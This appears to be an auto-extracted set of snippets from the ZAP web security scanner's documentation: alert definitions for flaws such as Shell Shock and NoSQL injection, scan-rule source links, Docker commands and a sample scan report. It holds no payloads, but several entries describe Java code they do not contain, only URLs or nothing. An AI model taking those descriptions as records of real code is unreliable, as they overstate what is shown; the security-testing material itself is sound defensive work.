        name: "inline-test"
        inline: |
          print("This is a simple example")
          print("Of a multi-line script")
  - type: script
      parameters:
        action: "run"
        type: "standalone"
        name: "inline-test"


----------------------------------------

TITLE: Defining Metadata and Redirect for Spider Documentation in Markdown
DESCRIPTION: This snippet defines the metadata for the Spider documentation page, including title, type, and weight. It also specifies a redirect to the current location of the documentation.

LANGUAGE: markdown
CODE:
---
# This page was generated from the add-on.
title: Spider
type: userguide
weight: 25
redirect: /docs/desktop/addons/spider/
---

----------------------------------------

TITLE: Running curl from ZAP Docker Image to Test Web Application Connectivity
DESCRIPTION: This command demonstrates how to use curl within the ZAP Docker container to test connectivity to a web application. It's useful for isolating whether the connection issue is specific to ZAP or a general networking problem.

LANGUAGE: bash
CODE:
docker run --rm ghcr.io/zaproxy/zaproxy:weekly /usr/bin/curl https://www.example.com/

----------------------------------------

TITLE: Demonstrating Base64 Encoding Detection in WebSocket Payloads
DESCRIPTION: This code snippet shows examples of how the Base64 Disclosure rule detects encoded strings in WebSocket payloads. It includes cases for true positives, false negatives, and false positives.

LANGUAGE: markdown
CODE:
|   Original   |           Payload           |    Outcome     |
|--------------|-----------------------------|----------------|
| Hello World  | SGVsbG8gV29ybGQ=            | True Positive  |
| Hello World  | THIS_ISSGVsbG8gV29ybGQ=TEXT | True Positive  |
| Hello World! | SGVsbG8gV29ybGQK            | False Negative |
| 122==122     | *Invalid*                   | False Positive |

----------------------------------------

TITLE: Alert Configuration YAML
DESCRIPTION: YAML configuration defining the properties file disclosure security alert parameters, including risk level, solution, references, and associated security standards.

LANGUAGE: yaml
CODE:
title: "Properties File Disclosure - /WEB-INF folder"
alertid: 10045-2
alertindex: 1004502
alerttype: "Active"
alertcount: 2
status: release
type: alert
risk: High
solution: "The web server should be configured to not serve the /WEB-INF folder or its contents to web browsers. It may also be possible to remove the /WEB-INF folder."
references:
   - https://owasp.org/www-community/attacks/Forced_browsing
   - https://cwe.mitre.org/data/definitions/425.html
other: "The reference to the properties file was found in the dis-assembled Java source code for Java class [https://example.com/foo.class]."
cwe: 541
wasc: 34
alerttags: 
  - CWE-541
  - OWASP_2017_A06
  - OWASP_2021_A05
  - POLICY_QA_FULL
  - WSTG-v42-CONF-05

----------------------------------------

TITLE: Configuring spiderClient Job in ZAP Automation Framework
DESCRIPTION: This YAML configuration defines the parameters for the spiderClient job in ZAP's Automation Framework. It allows customization of the Client Spider's behavior, including context selection, user authentication, URL targeting, runtime limits, and browser settings.

LANGUAGE: yaml
CODE:
  - type: spiderClient                 # The client spider - a spider which explores modern web apps more effectively
    parameters:
      context:                         # String: Name of the context to spider, default: first context
      user:                            # String: An optional user to use for authentication, must be defined in the env
      url:                             # String: URL to start spidering from, default: first context URL
      maxDuration:                     # Int: The max time in minutes the spider will be allowed to run for, default: 0 unlimited
      maxCrawlDepth:                   # Int: The maximum tree depth to explore, default 5
      maxChildren:                     # Int: The maximum number of children to add to each node in the tree
      numberOfBrowsers:                # Int: The number of browsers the spider will use, more will be faster but will use up more memory, default: number of cores
      browserId:                       # String: Browser ID to use, default: firefox-headless
      initialLoadTime:                 # Int: The time in seconds to wait after the initial URL is loaded, default: 5
      pageLoadTime:                    # Int: The time in seconds to wait after a new URL is loaded, default: 1
      shutdownTime:                    # Int: The time in seconds to wait after no activity before shutting down, default: 5

----------------------------------------

TITLE: Running ZAPit with Docker for Polyfill.io Detection
DESCRIPTION: This command uses Docker to run ZAP's ZAPit tool, installing the passive scan rules beta add-on and scanning a specified URL for polyfill.io scripts. It demonstrates a quick way to check URLs without having ZAP installed locally.

LANGUAGE: bash
CODE:
docker run -t zaproxy/zap-stable zap.sh -cmd -addoninstall pscanrulesBeta -zapit https://www.example.com/

----------------------------------------

TITLE: Implementing Shell Shock Scan Rule in Java for ZAP
DESCRIPTION: This code snippet represents the implementation of the Shell Shock scan rule in ZAP. It's located in the ShellShockScanRule.java file within the ascanrulesBeta add-on.

LANGUAGE: java
CODE:
// No code snippet provided in the input text. Actual implementation details are located at:
// https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/ShellShockScanRule.java

----------------------------------------

TITLE: Implementing Backup File Disclosure Scan Rule in Java for ZAP
DESCRIPTION: This code implements the BackupFileDisclosureScanRule class in Java for ZAP's active scanning. It detects backup files that may be inadvertently exposed on web servers, potentially leading to information disclosure.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/BackupFileDisclosureScanRule.java

----------------------------------------

TITLE: Listing GraphQL Command Line Options in Markdown
DESCRIPTION: Specifies the command-line options available for the GraphQL add-on, including options to import definitions from files or URLs and set the endpoint URL.

LANGUAGE: markdown
CODE:
The following Command Line options are added:

* -graphqlfile \<filename\> : Imports a GraphQL definition from a File
* -graphqlurl \<url\> : Imports a GraphQL definition from a URL
* -graphqlendurl \<url\> : Sets the Endpoint URL

----------------------------------------

TITLE: LDAP Injection Scanner in Java
DESCRIPTION: Detects LDAP injection vulnerabilities that could allow authentication bypass and directory manipulation. Excludes messages with error status codes.

LANGUAGE: Java
CODE:
LdapInjectionScanRule.java

----------------------------------------

TITLE: Configuring Additional Python Modules Path in ZAP
DESCRIPTION: This configuration option allows users to specify the directory path for additional Python modules or libraries to be used in Python scripting within ZAP. The path is set using the 'jython.modulepath' key in the config file.

LANGUAGE: markdown
CODE:
|             Field              |                                      Details                                      | Default |                            Config File                             |
|--------------------------------|-----------------------------------------------------------------------------------|---------|--------------------------------------------------------------------|\n| Additional Python modules path | The path to the directory with additional modules/libraries for Python scripting. | (none)  | Key: `jython.modulepath` Values: file system path to the directory |

----------------------------------------

TITLE: Dynamic Log Level Configuration using JavaScript
DESCRIPTION: Stand Alone script to programmatically configure logging levels for specific ZAP components while the application is running.

LANGUAGE: javascript
CODE:
var Configurator = Java.type("org.apache.logging.log4j.core.config.Configurator");
var Level = Java.type("org.apache.logging.log4j.Level");

// https://logging.apache.org/log4j/2.x/javadoc.html
Configurator.setLevel({
  // The following will enable DEBUG logging for the API
  "org.zaproxy.zap.extension.api.API" : Level.DEBUG,
  // The following will enable DEBUG logging for the Session Fixation scan rule
  "org.zaproxy.zap.extension.ascanrulesBeta.SessionFixationScanRule" : Level.DEBUG,
  // The following will enable DEBUG logging for the spider add-on
  "org.zaproxy.addon.spider" : Level.DEBUG,
});

----------------------------------------

TITLE: Retrieving WebSocket Messages View in Markdown
DESCRIPTION: Explains the 'messages' view for retrieving multiple messages, including optional parameters for filtering and pagination.

LANGUAGE: markdown
CODE:
### messages

Optional Parameters:

* channelId: the channel identifier
* start: the offset to start returning messages from, starting from 0.
* count: the number of messages to return.
* payloadPreviewLength: the maximum number bytes to return for the payload contents.

Returns a list of all of the messages that meet the given criteria - by default all messages are returned  
The channelId can be discovered via the 'channels' view.  
The 'start' and 'count' parameters can be used to page through the messages  
The 'payloadPreviewLength' can be used to restrict the size of the data returned.  

----------------------------------------

TITLE: Shell Shock Alert Configuration in YAML
DESCRIPTION: YAML configuration for Shell Shock vulnerability alert in ZAP proxy, including risk level, solution, references, and associated security standards (CWE, WASC, OWASP).

LANGUAGE: yaml
CODE:
title: "Remote Code Execution - Shell Shock"
alertid: 10048-1
alertindex: 1004801
alerttype: "Active"
alertcount: 2
status: beta
type: alert
risk: High
solution: "Update Bash on the server to the latest version."
references:
   - https://nvd.nist.gov/vuln/detail/CVE-2014-6271
   - https://www.troyhunt.com/everything-you-need-to-know-about2/
other: "From CVE-2014-6271: GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka \"ShellShock.\" NOTE: the original fix for this issue was incorrect; CVE-2014-7169 has been assigned to cover the vulnerability that is still present after the incorrect fix."
cwe: 78
wasc: 31
alerttags: 
  - CWE-78
  - OWASP_2017_A09
  - OWASP_2021_A06
  - WSTG-v42-INPV-12
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/ShellShockScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrulesBeta/ShellShockScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-beta/#id-10048

----------------------------------------

TITLE: Implementing Path Traversal Scan Rule in Java
DESCRIPTION: This code snippet refers to the implementation of a Path Traversal scan rule in ZAP (Zed Attack Proxy). It's part of the active scan rules and is responsible for detecting Path Traversal vulnerabilities in web applications.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/PathTraversalScanRule.java

----------------------------------------

TITLE: Defining Strict-Transport-Security Header Alerts in YAML
DESCRIPTION: This YAML snippet defines multiple alerts related to the Strict-Transport-Security header. Each alert has a unique ID and name, covering various scenarios of HSTS implementation and potential issues.

LANGUAGE: yaml
CODE:
---
title: "Strict-Transport-Security Header"
alertid: 10035
alertindex: 1003500
alerttype: "Passive"
status: release
type: alertset
alerts:
   10035-1:
      alertid: 10035-1
      name: "Strict-Transport-Security Header Not Set"
   10035-2:
      alertid: 10035-2
      name: "Strict-Transport-Security Disabled"
   10035-3:
      alertid: 10035-3
      name: "Strict-Transport-Security Multiple Header Entries (Non-compliant with Spec)"
   10035-4:
      alertid: 10035-4
      name: "Strict-Transport-Security Header on Plain HTTP Response"
   10035-5:
      alertid: 10035-5
      name: "Strict-Transport-Security Missing Max-Age (Non-compliant with Spec)"
   10035-6:
      alertid: 10035-6
      name: "Strict-Transport-Security Defined via META (Non-compliant with Spec)"
   10035-7:
      alertid: 10035-7
      name: "Strict-Transport-Security Max-Age Malformed (Non-compliant with Spec)"
   10035-8:
      alertid: 10035-8
      name: "Strict-Transport-Security Malformed Content (Non-compliant with Spec)"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java"

----------------------------------------

TITLE: Generating ZAP Callback URL for Browser Extension
DESCRIPTION: This snippet shows the format of the callback URL generated by ZAP for secure communication with the browser extension. The URL includes a unique identifier to prevent malicious targets from abusing the API endpoints.

LANGUAGE: plaintext
CODE:
http://zap/zapCallBackUrl/12345678901234567890

----------------------------------------

TITLE: Implementing Relative Path Confusion Scan Rule in Java for ZAP
DESCRIPTION: This code snippet represents the implementation of the Relative Path Confusion scan rule in ZAP. It is located in the RelativePathConfusionScanRule.java file within the ZAP extensions project.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/RelativePathConfusionScanRule.java

----------------------------------------

TITLE: MongoDB NoSQL Injection Alert Definition
DESCRIPTION: YAML configuration defining the properties of a MongoDB NoSQL injection security alert. Includes alert identifiers, risk level, solution recommendations, and relevant security standards references.

LANGUAGE: yaml
CODE:
title: "NoSQL Injection - MongoDB (Time Based)"
alertid: 90039
alertindex: 9003900
alerttype: "Active"
alertcount: 1
status: alpha
type: alert
risk: High
solution: "Do not trust client side input and escape all data on the server side. Avoid to use the query input directly into the where and group clauses and upgrade all drivers at the latest available version."
references:
   - https://arxiv.org/pdf/1506.04082.pdf
   - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.html
other: "Through the where or group MongoDB clauses, Javascript sleep function is probably executable."
cwe: 943
wasc: 19
techtags: 
  - Db.MongoDB
alerttags: 
  - CWE-943
  - OWASP_2017_A01
  - OWASP_2021_A03
  - TEST_TIMING
  - WSTG-v42-INPV-05

----------------------------------------

TITLE: Listing GraphQL API Actions in Markdown
DESCRIPTION: Enumerates the available action operations in the GraphQL API, including import methods and option setters. Asterisks indicate required parameters.

LANGUAGE: markdown
CODE:
### Actions

* importFile (endurl\*, file\*)
* importUrl (endurl\*, url)
* setOptionArgsType (String\*)
* setOptionMaxArgsDepth (Integer\*)
* setOptionMaxQueryDepth (Integer\*)
* setOptionOptionalArgsEnabled (Boolean\*)
* setOptionQueryGenEnabled (Boolean\*)
* setOptionQuerySplitType (String\*)
* setOptionRequestMethod (String\*)

----------------------------------------

TITLE: Illustrating Debug Error Detection in WebSocket Messages
DESCRIPTION: This code snippet demonstrates examples of how the Information Disclosure: Debug Errors rule identifies known debug error message fragments in WebSocket payloads.

LANGUAGE: markdown
CODE:
|                   Use case                    |    Outcome    |
|-----------------------------------------------|---------------|
| Error Occurred While Processing Request       | True Positive |
| PHP Warning: Error While Sending QUERY Packet | True Positive |

----------------------------------------

TITLE: Displaying Form Handler Example in Markdown
DESCRIPTION: This snippet shows how to embed an image in Markdown to illustrate the Form Handler support in the SOAP add-on.

LANGUAGE: markdown
CODE:
![Form Handler Example](/docs/desktop/addons/soap-support/images/formHandlerExample.png)

----------------------------------------

TITLE: Setting Debug Log Levels in log4j2.properties
DESCRIPTION: Configuration to enable debug level logging for core ZAP components, which provides more detailed logging output.

LANGUAGE: properties
CODE:
logger.paros.name = org.parosproxy.paros
logger.paros.level = debug

logger.zap.name = org.zaproxy.zap
logger.zap.level = debug

----------------------------------------

TITLE: Scanning for X-Backend-Server Header Leaks in Java
DESCRIPTION: This code snippet is part of a passive scan rule in ZAP (Zed Attack Proxy) that detects X-Backend-Server header information leaks. It likely contains methods to analyze HTTP responses and identify potentially leaked backend server information.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/XBackendServerInformationLeakScanRule.java

----------------------------------------

TITLE: Running Noir with ZAP Proxy Integration for Manual Testing
DESCRIPTION: This command demonstrates how to use Noir to analyze endpoints and send them to ZAP using the --send-proxy flag. It populates ZAP's History and Sites tabs for direct analysis within ZAP's interface.

LANGUAGE: sh
CODE:
noir -b . -u http://localhost.hahwul.com:3000 --send-proxy "http://localhost:8090"

----------------------------------------

TITLE: ZAP UI Mode Report Generation
DESCRIPTION: Launches ZAP with UI interface to attack a target URL and save the report to a specified XML file path.

LANGUAGE: bash
CODE:
-quickurl http://example.com/ -quickout /path/to/report.xml

----------------------------------------

TITLE: Implementing Apache Range Header DoS Scan Rule in Java
DESCRIPTION: This code snippet implements the scan rule for detecting the Apache Range Header DoS vulnerability. It is part of the ZAP extension for beta active scan rules.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/ApacheRangeHeaderDosScanRule.java

----------------------------------------

TITLE: Implementing Directory Browsing Detection in Java for ZAP Scanner
DESCRIPTION: Java implementation for detecting directory browsing vulnerabilities in web applications. The code scans for exposed directory listings that could reveal sensitive files like scripts, includes, and backups. Located in the ZAP extensions codebase under active scan rules.

LANGUAGE: java
CODE:
// Source file: org/zaproxy/zap/extension/ascanrules/DirectoryBrowsingScanRule.java
// Code available at: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/DirectoryBrowsingScanRule.java

----------------------------------------

TITLE: Demonstrating Suspicious XML Comment Detection in WebSocket Payloads
DESCRIPTION: This code snippet shows examples of how the Information Disclosure: Suspicious XML Comments rule identifies potentially sensitive comments in XML-formatted WebSocket messages.

LANGUAGE: markdown
CODE:
|                             Use case                             |    Outcome    |
|------------------------------------------------------------------|---------------|
| ``` <xml_test><!-- This is a comments section --></xml_test> ``` | True Negative |
| ``` <user_form><!-- FIXME: Encode --></user_form> ```            | True Positive |

----------------------------------------

TITLE: Alert Configuration for Vulnerable JS Library Detection
DESCRIPTION: YAML configuration defining metadata for a security alert that identifies outdated and vulnerable JavaScript libraries. Includes alert ID, risk level, remediation guidance, and security framework mappings.

LANGUAGE: yaml
CODE:
title: "Vulnerable JS Library"
alertid: 10003
alertindex: 1000300
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Medium
solution: "Upgrade to the latest version of the affected library."
references:
   - https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
other: "The identified library ExampleLibrary.js, version 13.3.7 is vulnerable. "
cwe: 1395
alerttags: 
  - CWE-1395
  - OWASP_2017_A09
  - OWASP_2021_A06
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/retire/src/main/java/org/zaproxy/addon/retire/RetireScanRule.java
linktext: "org/zaproxy/addon/retire/RetireScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/retire.js/#id-10003

----------------------------------------

TITLE: Utility JavaScript Functions for Form Handling
DESCRIPTION: JavaScript utility functions included in the response body, providing functionality for loading files dynamically, converting form data to parameters, and handling HTML entities encoding.

LANGUAGE: javascript
CODE:
function loadfile(filename){
    var filetype = filename.split('.').pop();
    switch (filetype){
        case "js":
            var insert=document.createElement('script')
            insert.setAttribute("type","text/javascript")
            insert.setAttribute("src", filename)
            break;
        case 'css':
            var insert=document.createElement("link");
            insert.setAttribute("type", "text/css")
            insert.setAttribute("href", filename)
            insert.setAttribute("rel", "stylesheet")
            break;
    }
    if (typeof insert!="undefined")
        document.getElementsByTagName("head")[0].appendChild(insert);
    return false;
}

function form_to_params(form) {
    // Form processing code truncated
}

function htmlEntities(str) {
    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

----------------------------------------

TITLE: JsoScanRule - Java Serialization Object Detection
DESCRIPTION: Detects Java Serialization Objects (JSO) which can lead to security issues like data leaks and remote code execution. Part of A8:2017-Insecure Deserialization vulnerabilities.



----------------------------------------

TITLE: Illustrating Application Error Detection in WebSocket Messages
DESCRIPTION: This code snippet demonstrates examples of how the Information Disclosure: Application Errors rule identifies known error messages in WebSocket payloads.

LANGUAGE: markdown
CODE:
|                                                  Use case                                                   |    Outcome    |
|-------------------------------------------------------------------------------------------------------------|---------------|
| Warning: Cannot modify header information - headers already sent                                            | True Positive |
| 'this' is null or not an object                                                                             | True Positive |
| System.Data.OleDb.OleDbException: Syntax error in string in query expression 'User ID = ? And Password = ?' | True Positive |

----------------------------------------

TITLE: Defining OpenAPI Path with Parameters in YAML
DESCRIPTION: This YAML snippet defines an OpenAPI path with a path parameter 'username'. It demonstrates how path parameters are specified in OpenAPI definitions, which can be used to generate data-driven nodes in ZAP.

LANGUAGE: yaml
CODE:
    ...
    /users/v1/{username}/email:
      ...
      parameters:
        - name: username
          in: path
          description: username to update email
          required: true
          schema:
            type: string
    ...

----------------------------------------

TITLE: Scanning Content Security Policy in Java
DESCRIPTION: This code snippet is part of a passive scan rule in ZAP (Zed Attack Proxy) that analyzes Content Security Policy headers. It likely checks for the presence of 'unsafe-hashes' in the script-src directive.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyScanRule.java

----------------------------------------

TITLE: Httpoxy Alert Configuration in YAML
DESCRIPTION: YAML configuration for the Httpoxy vulnerability scanner alert, defining risk levels, solutions, references and classification tags.

LANGUAGE: yaml
CODE:
title: "Httpoxy - Proxy Header Misuse"
alertid: 10107
alertindex: 1010700
alerttype: "Active"
alertcount: 1
status: beta
type: alert
risk: High
solution: "The best immediate mitigation is to block Proxy request headers as early as possible, and before they hit your application."
references:
   - https://httpoxy.org/
other: "An outgoing message to http://192.168.0.11:1080/ was proxied via the host and port that ZAP injected into the HTTP Proxy header."
cwe: 20
wasc: 20
alerttags: 
  - CWE-20
  - OWASP_2017_A09
  - OWASP_2021_A06
  - POLICY_QA_FULL
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/HttPoxyScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrulesBeta/HttPoxyScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-beta/#id-10107

----------------------------------------

TITLE: Detecting IBAN Numbers in HTTP Responses using JavaScript
DESCRIPTION: This script passively scans HTTP responses for IBAN numbers. It is part of the ZAP community scripts and helps identify potential information disclosure vulnerabilities.

LANGUAGE: javascript
CODE:
https://github.com/zaproxy/community-scripts/blob/main/passive/Find%20IBANs.js

----------------------------------------

TITLE: Defining YAML Frontmatter for Access Control Testing Add-on SBOM
DESCRIPTION: This YAML frontmatter defines metadata for the Access Control Testing Add-on's Software Bill of Materials (SBOM). It includes the add-on ID, version, SBOM format, download URL, and a list of components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: Access Control Testing Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: accessControl
    version: '10'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/accessControl-v10/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... (truncated for brevity)
  - name: zap
    version: 2.14.0
    licenses: Apache-2.0
---

----------------------------------------

TITLE: Implementing CSP Scan Rule in Java for ZAP
DESCRIPTION: This code snippet is part of the ContentSecurityPolicyScanRule class in ZAP, which implements the passive scan rule for detecting unsafe CSP configurations. It likely contains methods for parsing and analyzing CSP headers, with specific checks for the 'unsafe-hashes' directive in style-src.

LANGUAGE: java
CODE:
// Code reference:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyScanRule.java

----------------------------------------

TITLE: Implementing XML Comments Disclosure Detection for WebSocket in JavaScript
DESCRIPTION: This script template is designed to detect suspicious XML comments in WebSocket messages. It defines the alert properties and provides a link to the full implementation.

LANGUAGE: javascript
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/websocket/src/main/zapHomeFiles/scripts/templates/websocketpassive/XML%20Comments%20Disclosure.js

----------------------------------------

TITLE: JsFunctionScanRule - Dangerous JavaScript Function Detection
DESCRIPTION: Scans responses for dangerous JavaScript functions. Supports custom payload definitions through the Custom Payloads add-on in the JS-Function category.



----------------------------------------

TITLE: Defining a Passive Scan Tag with Regex Interpolation
DESCRIPTION: This example demonstrates how to define a passive scan tag that uses regular expression capturing groups for dynamic tag creation. The tag will match 3-digit numbers in the response body and create tags like '123-SOMETAG'.

LANGUAGE: markdown
CODE:
|        Field         |   Value    |                                 Note                                 |
|----------------------|------------|----------------------------------------------------------------------|
| Name:                | Test       |                                                                      |
| Tag:                 | $1-SOMETAG |                                                                      |
| Response Body Regex: | (\\d{3})   | Find strings of 3 numbers, using a capturing group (round brackets). |

----------------------------------------

TITLE: Example URL Request Patterns in ZAP
DESCRIPTION: Sample URL patterns demonstrating how ZAP's Sites Tree handles different request structures with parameters and path elements.

LANGUAGE: http
CODE:
GET https://www.example.com?a=b&c=d
GET https://www.example.com?a=b&d=c
POST https://www.example.com?a=b&c=d

----------------------------------------

TITLE: Generating ZAP Security Report in Markdown
DESCRIPTION: This snippet demonstrates the structure of a ZAP security report in Markdown format. It includes a summary of alerts by risk level, a detailed list of alerts with their risk levels and instance counts, and an example of how to present detailed information for a specific vulnerability (Anti-CSRF Tokens Check).

LANGUAGE: markdown
CODE:
# ZAP by Checkmarx Scanning Report

## Summary of Alerts

| Risk Level | Number of Alerts |
| --- | --- |
| High | 2 |
| Medium | 4 |
| Low | 8 |
| Informational | 6 |

## Alerts

| Name | Risk Level | Number of Instances |
| --- | --- | --- |
| Anti-CSRF Tokens Check | High | 10 |
| Cross Site Scripting (Reflected) | High | 2 |
| Buffer Overflow | Medium | 529 |
| Content Security Policy (CSP) Header Not Set | Medium | 58 |
| Example Passive Scan Rule: Denial of Service | Medium | 7 |
| X-Frame-Options Header Not Set | Medium | 55 |
| Absence of Anti-CSRF Tokens | Low | 73 |
| Application Error Disclosure | Low | 1 |
| Cookie No HttpOnly Flag | Low | 1 |
| Cookie without SameSite Attribute | Low | 2 |
| In Page Banner Information Leak | Low | 3 |
| Information Disclosure - Debug Error Messages | Low | 1 |
| Permissions Policy Header Not Set | Low | 59 |
| X-Content-Type-Options Header Missing | Low | 62 |
| Information Disclosure - Suspicious Comments | Informational | 58 |
| Loosely Scoped Cookie | Informational | 3 |
| Modern Web Application | Informational | 33 |
| Non-Storable Content | Informational | 2 |
| Storable and Cacheable Content | Informational | 64 |
| User Controllable HTML Element Attribute (Potential XSS) | Informational | 32 |

## Alert Detail

### [ Anti-CSRF Tokens Check ](https://www.zaproxy.org/docs/alerts/20012/)

##### High (Medium)

### Description

A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.

CSRF attacks are effective in a number of situations, including:
    * The victim has an active session on the target site.
    * The victim is authenticated via HTTP auth on the target site.
    * The victim is on the same local network as the target site.

CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.

* URL: http://localhost:8080/bodgeit/advanced.jsp
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form id="advanced" name="advanced" method="POST" onsubmit="return validateForm(this);false;">`
  * Other Info: ``
* URL: http://localhost:8080/bodgeit/advanced.jsp
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form id="query" name="advanced" method="POST">`
  * Other Info: ``
* URL: http://localhost:8080/bodgeit/basket.jsp
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<form action="basket.jsp" method="post">`
  * Other Info: ``

----------------------------------------

TITLE: Detecting Amazon S3 Bucket URLs in JavaScript
DESCRIPTION: A passive scanning script that searches for Amazon S3 bucket URLs in HTTP response bodies. The script is part of the ZAP community scripts and helps identify potential information disclosure vulnerabilities related to exposed S3 bucket URLs.

LANGUAGE: plaintext
CODE:
Risk Level: Low\nSolution: Remove S3 Bucket names from the response or ensure that the permissions in bucket are configured properly.\nCWE ID: 200\nWASC ID: 13

----------------------------------------

TITLE: Installing ZAP via Winget
DESCRIPTION: Command to install OWASP ZAP using Windows Package Manager. The -e flag ensures exact match for the package ID.

LANGUAGE: shell
CODE:
winget install --id=ZAP.ZAP -e

----------------------------------------

TITLE: Implementing CSP Scan Rule in Java for ZAP
DESCRIPTION: This code snippet is part of a ZAP extension that implements a passive scan rule to detect malformed Content Security Policy headers. It checks for non-ASCII characters in the policy, which render it invalid.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyScanRule.java

----------------------------------------

TITLE: Alert Definition for Cache Control Scanner in YAML
DESCRIPTION: YAML configuration defining the alert parameters for ZAP's cache control scanner including alert ID, risk level, solution guidance, and reference links.

LANGUAGE: yaml
CODE:
title: "Re-examine Cache-control Directives"
alertid: 10015
alertindex: 1001500
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Informational
solution: "For secure content, ensure the cache-control HTTP header is set with \"no-cache, no-store, must-revalidate\". If an asset should be cached consider setting the directives \"public, max-age, immutable\"."
references:
   - https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#web-content-caching
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control
   - https://grayduck.mn/2021/09/13/cache-control-recommendations/
other: ""
cwe: 525
wasc: 13
alerttags: 
  - CWE-525
  - WSTG-v42-ATHN-06

----------------------------------------

TITLE: Implementing AbstractPlugin.scan() Method for Active Scanning in ZAP
DESCRIPTION: The scan() method is a key method to implement when extending AbstractPlugin or its subclasses. This is where you perform your attacks against the target.

LANGUAGE: Java
CODE:
public void scan() {
    // Perform attacks here
}

----------------------------------------

TITLE: Defining SBOM Metadata in YAML
DESCRIPTION: This YAML snippet defines metadata for the Sequence Add-on's Software Bill of Materials (SBOM). It specifies the add-on ID, version, SBOM format, and download URL.

LANGUAGE: yaml
CODE:
title: Sequence Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: sequence
    version: '8'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/sequence-v8/bom.json

----------------------------------------

TITLE: Implementing X-Debug-Token Scanner in Java for ZAP
DESCRIPTION: This code snippet implements a passive scan rule in ZAP to detect X-Debug-Token headers in HTTP responses. It's part of the org.zaproxy.zap.extension.pscanrules package and extends functionality for identifying potential information leaks in Symfony applications.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/XDebugTokenScanRule.java

----------------------------------------

TITLE: Link to Full Path Disclosure Implementation
DESCRIPTION: Reference to Java implementation for detecting full application paths that could expose sensitive information to attackers.

LANGUAGE: markdown
CODE:
